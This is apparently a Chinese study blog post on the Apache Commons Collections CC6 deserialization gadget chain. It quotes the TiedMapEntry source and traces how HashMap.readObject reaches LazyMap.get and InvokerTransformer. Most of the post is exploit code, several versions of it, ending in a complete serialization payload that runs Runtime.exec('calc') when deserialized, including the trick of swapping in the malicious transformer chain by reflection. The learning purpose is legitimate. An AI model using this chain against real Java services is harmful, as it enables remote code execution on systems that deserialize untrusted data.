TiedMapEntry 与 getValueget方法是追踪到了tiedmapentry里面
/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.keyvalue;    import java.io.Serializable;  import java.util.Map;    import org.apache.commons.collections.KeyValue;    /**   * A &#123;@link java.util.Map.Entry Map.Entry&#125; tied to a map underneath.   * &lt;p&gt;   * This can be used to enable a map entry to make changes on the underlying   * map, however this will probably mess up any iterators. * * @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   ** @author Stephen Colebourne   */public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;        /** Serialization version */      private static final long serialVersionUID = -8453869361373831205L;        /** The map underlying the entry/iterator */      private final Map map;      /** The key */      private final Object key;        /**       * Constructs a new entry with the given Map and key.     *     * @param map  the map       * @param key  the key       */    public TiedMapEntry(Map map, Object key) &#123;          super();          this.map = map;          this.key = key;      &#125;        // Map.Entry interface      //-------------------------------------------------------------------------    /**       * Gets the key of this entry     ** @return the key       */    public Object getKey() &#123;          return key;      &#125;        /**       * Gets the value of this entry direct from the map.     ** @return the value       */    public Object getValue() &#123;          return map.get(key);      &#125;        /**       * Sets the value associated with the key direct onto the map.     ** @param value  the new value       * @return the old value       * @throws IllegalArgumentException if the value is set to this map entry       */    public Object setValue(Object value) &#123;          if (value == this) &#123;              throw new IllegalArgumentException(&quot;Cannot set value to this map entry&quot;);          &#125;          return map.put(key, value);      &#125;        /**       * Compares this &lt;code&gt;Map.Entry&lt;/code&gt; with another &lt;code&gt;Map.Entry&lt;/code&gt;.       * &lt;p&gt;       * Implemented per API documentation of &#123;@link java.util.Map.Entry#equals(Object)&#125;       ** @param obj  the object to compare to       * @return true if equal key and value       */    public boolean equals(Object obj) &#123;          if (obj == this) &#123;              return true;          &#125;          if (obj instanceof Map.Entry == false) &#123;              return false;          &#125;          Map.Entry other = (Map.Entry) obj;          Object value = getValue();          return              (key == null ? other.getKey() == null : key.equals(other.getKey())) &amp;&amp;              (value == null ? other.getValue() == null : value.equals(other.getValue()));      &#125;        /**       * Gets a hashCode compatible with the equals method.     * &lt;p&gt;       * Implemented per API documentation of &#123;@link java.util.Map.Entry#hashCode()&#125;       ** @return a suitable hash code       */    public int hashCode() &#123;          Object value = getValue();          return (getKey() == null ? 0 : getKey().hashCode()) ^                 (value == null ? 0 : value.hashCode());       &#125;        /**       * Gets a string version of the entry.     ** @return entry as a string       */    public String toString() &#123;          return getKey() + &quot;=&quot; + getValue();      &#125;    &#125;
这个代码不长我们可以简单分析一下，现在我很喜欢看java代码这个过程这里定义了一个键值对的对象，里面的构造方法是公共的可以直接进行构造，终于不要用反射了，还定义了键值对的相关方法，比如判断键值对是否相等，获取value，设置vlaue等功能。我们发现这里的getvalue会调用get方法，我们先写一个简单的exp尝试一下
import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.keyvalue.TiedMapEntry;  import org.apache.commons.collections.map.LazyMap;    import javax.xml.crypto.dsig.Transform;  import java.util.HashMap;  import java.util.Map;    public class cc2 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();  //        Runtime runtime = Runtime.getRuntime();  //        InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          Transformer[] transformers = &#123;                  new ConstantTransformer(Runtime.class),                  new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                  new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                  new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);              Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);          TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;niao&quot;);          tiedMapEntry.getValue();          &#125;  &#125;
我写完这个链条之后一开始有点不理解，我们这个entry的key是一个字符串，调用getvalue方法之后调用lazymap的get方法，然后在get方法中又调用了transform方法，那这样不是字符串作为input吗，那他应该是获取到string类型的Class啊。后来发现我对其中的对象没有搞清楚，lazymap盗用transform方法的时候这个对象是chaintransformer，没有直接进入invoketransformer当中，所以首先先把输入变成Runtime.class，这个问题前面我们已经解释过了，到这里又想不通了，接下来我们继续，看谁调用了getvalue
public int hashCode() &#123;      Object value = getValue();      return (getKey() == null ? 0 : getKey().hashCode()) ^             (value == null ? 0 : value.hashCode());   &#125;

hashCode 与 HashMap 入口刚才在看代码的时候特地留了一段没讲，就是hashcode这个方法，这是我们接下来的关键，刚才找getvalue的调用发现有非常多的调用，不知道当年的大佬是怎么发现的换成我估计就放弃了，看博客说在这里优先看同类中是否有调用的，果然在hashcode中调用了这个方法。我们简单介绍一下这段代码，首先获得key对应的value，然后对key和value分别进行hashcode的计算如果为空就设为0，然后再对二者做异或运算。看博主说到了这一步如果在实战中遇到了hashcode基本上可以开香槟了，接下来还有比较完善的链条思路，首先hashmap中的hash方法使用了hashcode，put调用了hash，代码放在下面了
static final int hash(Object key) &#123;      int h;      return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);  &#125;
public V put(K key, V value) &#123;      return putVal(hash(key), key, value, false, true);  &#125;
同样在hashmap中的readobject中会进行hash的运算，这也是一个很好的入口类，
private void readObject(java.io.ObjectInputStream s)      throws IOException, ClassNotFoundException &#123;      // Read in the threshold (ignored), loadfactor, and any hidden stuff      s.defaultReadObject();      reinitialize();      if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))          throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                           loadFactor);      s.readInt();                // Read and ignore number of buckets      int mappings = s.readInt(); // Read number of mappings (size)      if (mappings &lt; 0)          throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                           mappings);      else if (mappings &gt; 0) &#123; // (if zero, use defaults)          // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);          float fc = (float)mappings / lf + 1.0f;          int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                     DEFAULT_INITIAL_CAPACITY :                     (fc &gt;= MAXIMUM_CAPACITY) ?                     MAXIMUM_CAPACITY :                     tableSizeFor((int)fc));          float ft = (float)cap * lf;          threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                       (int)ft : Integer.MAX_VALUE);          @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)              Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];          table = tab;            // Read the keys and values, and put the mappings in the HashMap          for (int i = 0; i &lt; mappings; i++) &#123;              @SuppressWarnings(&quot;unchecked&quot;)                  K key = (K) s.readObject();              @SuppressWarnings(&quot;unchecked&quot;)                  V value = (V) s.readObject();              ==🔵putVal(hash(key), key, value, false, false);==          &#125;      &#125;  &#125;


串起反序列化实验import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.keyvalue.TiedMapEntry;  import org.apache.commons.collections.map.LazyMap;    import javax.xml.crypto.dsig.Transform;  import java.util.HashMap;  import java.util.Map;    public class cc2 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();  //        Runtime runtime = Runtime.getRuntime();  //        InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          Transformer[] transformers = &#123;                  new ConstantTransformer(Runtime.class),                  new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                  new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                  new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);              Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);          TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;niao&quot;);  //        tiedMapEntry.getValue();          HashMap&lt;Object, Object&gt; cc2hashmap = new HashMap&lt;&gt;();          cc2hashmap.put(tiedMapEntry,&quot;thankyou&quot;);          &#125;  &#125;
可以弹计算机
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc2 &#123;    public static void main(String[] args) throws Exception &#123;        // 1. 构造恶意 Transformer 链        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;,                        new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        // 先用一个无害的链填充，put 完成后再通过反射换成恶意链，避免 put 时就触发        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);        // 2. 用 LazyMap 装饰 HashMap        Map&lt;Object, Object&gt; innerMap = new HashMap&lt;&gt;();        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(innerMap, chainedTransformer);        // 3. TiedMapEntry 持有 lazyMap，key 任意        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;niao&quot;);        // 4. 外层 HashMap：put 时会调用 key.hashCode()        HashMap&lt;Object, Object&gt; cc2hashmap = new HashMap&lt;&gt;();        cc2hashmap.put(tiedMapEntry, &quot;thankyou&quot;);        // 5. 关键坑：put 时 TiedMapEntry.hashCode() 会调用 lazyMap.get(&quot;niao&quot;)，        //    LazyMap 会把 &quot;niao&quot; 作为 key 放进 innerMap（即使没触发 transform 也会占位）。        //    这样反序列化时 TiedMapEntry.hashCode() 再次 get 会命中缓存，不会调用 transform。        //    因此必须把 innerMap 里的 &quot;niao&quot; 删掉。        innerMap.remove(&quot;niao&quot;);        // 6. 反射把恶意链写回 ChainedTransformer 的 iTransformers 字段        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        f.setAccessible(true);        f.set(chainedTransformer, transformers);        // 7. 序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(cc2hashmap);        oos.close();        byte[] payload = baos.toByteArray();        // 8. 反序列化（触发计算器）        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));        ois.readObject();    &#125;&#125;

实验修正与最终代码这是最终的exp，可以看到DeepSeek进行了一些修改，我们反思一下
很严重的问题我们不进行序列化反序列化他就执行命令了，我们执行put的时候依次执行hash，hashcode，getvalue，get，到get这一步的时候对象是lazymap，确定key是没有被保存过的就执行get然后再执行transform他出计算器，这个流程我们预想应该发生在反序列化的时候。然后map保存之后key就存在在hashmap里了。
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.xml.crypto.dsig.Transform;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc2 &#123;    public static void main(String[] args) throws Exception &#123;        HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();//        Runtime runtime = Runtime.getRuntime();//        InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        Transformer[] transformers = &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(&quot;This is fake!!!&quot;)&#125;);        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;niao&quot;);//        tiedMapEntry.getValue();        HashMap&lt;Object, Object&gt; cc2hashmap = new HashMap&lt;&gt;();        cc2hashmap.put(tiedMapEntry,&quot;thankyou&quot;);        objectObjectHashMap.remove(&quot;niao&quot;);        Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        iTransformers.setAccessible(true);        iTransformers.set(chainedTransformer,transformers);        // 序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(cc2hashmap);        oos.close();        // 反序列化（触发）        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));        ois.readObject();    &#125;&#125;
这是我最终完成的exp，修改了两个问题，一个是在put之后niao就被保存咋hashmap中了导致反序列化不会执行命令。另外一个就是保证在反序列化之前不执行命令保证链条的干净流畅性，所以我们put的是一个干净的chaintransformer，put之后我们通过反射把这个chaintransformer修改成恶意的，保证在反序列化的过程中可以执行。这一切的重点都在lazymap的get方法那里，如果以后想不起来了就去看这个代码。
学习回顾好的最后时间我们来总结一下我们的学习成果，首先链尾相比之前没有变化还是从invoketransformer出发，通过他的transform方法我们找到了lazymap的get方法调用了，然后接着找我们发信啊tiedmapentry里面的getvalue方法调用了get，然后同类中的hashcode调用了getvalue，然后hashmap里面的put调用了hash，hash调用了hashcode，这样的话我么就连成一条完整的线了。
在分析过程中要充分考虑java的多态这个特点，这是我们分析的关键也是不可缺少的思维。学完cc1之后果然学cc6快了很多。据听说cc6是最常用的链条。

